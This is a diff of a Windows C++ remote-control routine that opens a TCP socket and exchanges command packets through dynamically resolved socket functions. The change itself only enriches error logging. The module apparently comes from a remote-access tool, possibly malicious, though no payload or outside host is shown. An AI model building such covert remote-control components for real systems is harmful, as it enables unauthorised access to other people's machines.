@@ -1,15 +1,8 @@
 
-
 #include <windows.h>
 #include "RemoteControlProc.h"
 
 #include "../log.h"
-
-
-
-
-
-
 
 
 DWORD __stdcall RemoteControl(LPVOID)
@@ -19,13 +12,13 @@ DWORD __stdcall RemoteControl(LPVOID)
 		SOCKET hSock = lpsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (hSock == SOCKET_ERROR)
 		{
-			writeLog("RemoteControlProc lpsocket error\r\n");
+			writeLog("RemoteControlProc lpsocket error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 		DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
 		if (lpsetsockopt(hSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 		{
-			writeLog("RemoteControlProc lpsend time lpsetsockopt error code\r\n");
+			writeLog("RemoteControlProc lpsetsockopt SO_SNDTIMEO error:%d\r\n", GetLastError());
 			lpclosesocket(hSock);
 			return FALSE;
 		}
@@ -33,7 +26,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 		dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
 		if (lpsetsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 		{
-			writeLog("RemoteControlProc lprecv time lpsetsockopt error code\r\n");
+			writeLog("RemoteControlProc lpsetsockopt SO_RCVTIMEO error:%d\r\n", GetLastError());
 			lpclosesocket(hSock);
 			return FALSE;
 		}
@@ -56,7 +49,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 		if (lpBuf == 0)
 		{
 			lpclosesocket(hSock);
-			writeLog("RemoteControlProc new buf error\r\n");
+			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -66,7 +59,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 		{
 			lpclosesocket(hSock);
 			delete[] lpBuf;
-			writeLog("RemoteControlProc new buf error\r\n");
+			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -76,7 +69,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 			lpclosesocket(hSock);
 			delete[] lpBuf;
 			delete[]lpZlibBuf;
-			writeLog("RemoteControlProc new buf error\r\n");
+			writeLog("RemoteControlProc new buf error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -88,7 +81,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 			delete[]lpZlibBuf;
 			delete[] lpBuf;
 			delete[]lpBackup;
-			writeLog("RemoteControlProc SendCmdPacket error\r\n");
+			writeLog("RemoteControlProc SendCmdPacket error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -99,7 +92,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 			delete[]lpZlibBuf;
 			delete[] lpBuf;
 			delete[]lpBackup;
-			writeLog("RemoteControlProc RecvCmdPacket error\r\n");
+			writeLog("RemoteControlProc RecvCmdPacket error:%d\r\n", GetLastError());
 			return FALSE;
 		}
 
@@ -112,7 +105,7 @@ DWORD __stdcall RemoteControl(LPVOID)
 		return FALSE;
 	}
 	catch (...) {
-		writeLog("RemoteControl unhandled exception\r\n");
+		writeLog("RemoteControl exception\r\n");
 		return FALSE;
 	}
 }
